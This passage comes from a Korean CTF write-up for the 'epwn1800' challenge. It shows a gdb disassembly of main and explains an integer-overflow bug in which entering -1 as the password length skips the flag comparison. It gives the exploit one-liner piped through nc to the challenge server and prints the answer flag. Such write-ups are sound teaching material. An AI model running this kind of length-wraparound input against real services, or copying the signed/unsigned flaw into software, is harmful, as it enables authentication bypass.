   0x08048826 <+331>:	push   $0x8048a54
   0x0804882b <+336>:	call   0x8048510 <printf@plt>
   0x08048830 <+341>:	add    $0x10,%esp
   0x08048833 <+344>:	movl   $0x0,-0x130(%ebp)
   0x0804883d <+354>:	jmp    0x8048868 <main+397>
   0x0804883f <+356>:	mov    -0x130(%ebp),%edx
   0x08048845 <+362>:	mov    -0x124(%ebp),%eax
   0x0804884b <+368>:	lea    (%edx,%eax,1),%ebx
   0x0804884e <+371>:	mov    0x804a060,%eax
   0x08048853 <+376>:	sub    $0xc,%esp
   0x08048856 <+379>:	push   %eax
   0x08048857 <+380>:	call   0x80485b0 <fgetc@plt>
   0x0804885c <+385>:	add    $0x10,%esp
   0x0804885f <+388>:	mov    %al,(%ebx)
   0x08048861 <+390>:	addl   $0x1,-0x130(%ebp)
   0x08048868 <+397>:	movzbl -0x131(%ebp),%eax
   0x0804886f <+404>:	movzbl %al,%eax
   0x08048872 <+407>:	cmp    -0x130(%ebp),%eax
   0x08048878 <+413>:	jg     0x804883f <main+356>
   0x0804887a <+415>:	sub    $0xc,%esp
   0x0804887d <+418>:	lea    -0x11c(%ebp),%eax
   0x08048883 <+424>:	push   %eax
   0x08048884 <+425>:	call   0x8048580 <strlen@plt>
   0x08048889 <+430>:	add    $0x10,%esp
   0x0804888c <+433>:	add    $0x1,%eax
   0x0804888f <+436>:	mov    %eax,-0x120(%ebp)
   0x08048895 <+442>:	movzbl -0x131(%ebp),%eax
   0x0804889c <+449>:	add    $0x1,%eax
   0x0804889f <+452>:	mov    %al,-0x131(%ebp)
   0x080488a5 <+458>:	movzbl -0x131(%ebp),%eax
   0x080488ac <+465>:	movzbl %al,%eax
   0x080488af <+468>:	cmp    -0x120(%ebp),%eax
   0x080488b5 <+474>:	jge    0x80488c9 <main+494>
   0x080488b7 <+476>:	movzbl -0x131(%ebp),%eax
   0x080488be <+483>:	movzbl %al,%eax
   0x080488c1 <+486>:	mov    %eax,-0x12c(%ebp)
   0x080488c7 <+492>:	jmp    0x80488d5 <main+506>
   0x080488c9 <+494>:	mov    -0x120(%ebp),%eax
   0x080488cf <+500>:	mov    %eax,-0x12c(%ebp)
   0x080488d5 <+506>:	movl   $0x0,-0x130(%ebp)
   0x080488df <+516>:	jmp    0x8048925 <main+586>
   0x080488e1 <+518>:	mov    -0x130(%ebp),%edx
   0x080488e7 <+524>:	mov    -0x124(%ebp),%eax
   0x080488ed <+530>:	add    %edx,%eax
   0x080488ef <+532>:	movzbl (%eax),%edx
   0x080488f2 <+535>:	lea    -0x11c(%ebp),%ecx
   0x080488f8 <+541>:	mov    -0x130(%ebp),%eax
   0x080488fe <+547>:	add    %ecx,%eax
   0x08048900 <+549>:	movzbl (%eax),%eax
   0x08048903 <+552>:	cmp    %al,%dl
   0x08048905 <+554>:	je     0x804891e <main+579>
   0x08048907 <+556>:	sub    $0xc,%esp
   0x0804890a <+559>:	push   $0x8048a75
   0x0804890f <+564>:	call   0x8048570 <puts@plt>
   0x08048914 <+569>:	add    $0x10,%esp
   0x08048917 <+572>:	mov    $0x1,%eax
   0x0804891c <+577>:	jmp    0x804895f <main+644>
   0x0804891e <+579>:	addl   $0x1,-0x130(%ebp)
   0x08048925 <+586>:	mov    -0x130(%ebp),%eax
   0x0804892b <+592>:	cmp    -0x12c(%ebp),%eax
   0x08048931 <+598>:	jl     0x80488e1 <main+518>
   0x08048933 <+600>:	sub    $0xc,%esp
   0x08048936 <+603>:	push   $0x8048a7d
   0x0804893b <+608>:	call   0x8048570 <puts@plt>
   0x08048940 <+613>:	add    $0x10,%esp
   0x08048943 <+616>:	sub    $0x8,%esp
   0x08048946 <+619>:	lea    -0x11c(%ebp),%eax
   0x0804894c <+625>:	push   %eax
   0x0804894d <+626>:	push   $0x8048a88
   0x08048952 <+631>:	call   0x8048510 <printf@plt>
   0x08048957 <+636>:	add    $0x10,%esp
   0x0804895a <+639>:	mov    $0x0,%eax
   0x0804895f <+644>:	mov    -0x1c(%ebp),%ebx
   0x08048962 <+647>:	xor    %gs:0x14,%ebx
   0x08048969 <+654>:	je     0x8048970 <main+661>
   0x0804896b <+656>:	call   0x8048550 <__stack_chk_fail@plt>
   0x08048970 <+661>:	lea    -0xc(%ebp),%esp
   0x08048973 <+664>:	pop    %ecx
   0x08048974 <+665>:	pop    %ebx
   0x08048975 <+666>:	pop    %edi
   0x08048976 <+667>:	pop    %ebp
   0x08048977 <+668>:	lea    -0x4(%ecx),%esp
   0x0804897a <+671>:	ret
End of assembler dump.
````

이 문제엔 glibc가 제공하는 stack canary가 적용되어 있다.
또한, 비밀번호를 입력받는 곳이 Heap이고, 이곳에 code를 집어넣는다고 해도 이를 트리거할 방법이 없다. 하지만, 맨 처음에 비밀번호의 길이를 scanf로 입력받는 점에 주목할 수 있다.

scanf 부분 (*main+212 ~ *main+219) C로 바꾸면 다음과 같다.

````
uint8_t pwlen;
scanf(“%d”, pwlen);
````

pwlen + 1이 flag의 길이보다 짧은 경우, pwlen + 1만큼 우리가 입력한 값과 flag를 비교하기 위한 for 문에서 반복하게 된다.

````
int i = 0;
pwlen++;
for (i = 0; i < pwlen; i++)
{
    /* flag와 사용자가 입력한 값 비교 */
    /* 다른 바이트를 인식할 경우 실패*/
}
puts(“Congratz !”);
````

이 때, pwlen은 unsigned char로 취급되어야 안전하나 scanf에서는 signed int로 취급되고 있다. 이를 이용한 integer overflow가 가능하다.

pwlen에 –1을 대입할 경우, for문이 실행될 시점에서는 pwlen이 0이 되어 flag와 사용자 입력을 검사하는 코드를 건너뛸 수 있다. pwlen에 –1을 입력했을 경우, 사용자 입력을 pwlen만큼 읽어오므로, 255 (int8_t의 –1은 uint8_t의 255와 동일하다)만큼 입력받게 된다.

위 분석을 종합하면, flag를 읽기 위해선 password length을 –1로, 그 후에 255바이트를 아무 값이나 집어넣으면 된다.

````
ied206@TS140  ~/ISCTF/epwn1800
$ python -c "print '-1 ' + 'A'*253" | nc 45.32.46.195 10004
Input the password length : Input the password (length : 255
Congratz !
The flag is ISCTF{I don't need to match them :)}
````

C 표준에서 fflush는 출력용 스트림과만 쓰여야만 하므로, gcc에서 fflush(stdin);은 무시된다. 따라서 –1 뒤의 scanf용 delimeter space가 뒤의 fputc에서 읽히고, python의 print 함수는 끝에 개행문자를 붙이므로, 255개가 아닌 253개의 A를 입력하면 된다.

### Answer flag

````
flag = ISCTF{I don't need to match them :)}
````

## mPwn2000

## mPwn2300

## Misc2000

## Misc2300

## Misc2400

## Misc2500

## Misc2600

## Misc2700

## Misc2800

## Misc3000

## Web1000

## Web2000

## Bon1500

## Bon1700

## Bon2000

## Bon2300

## Bon2700
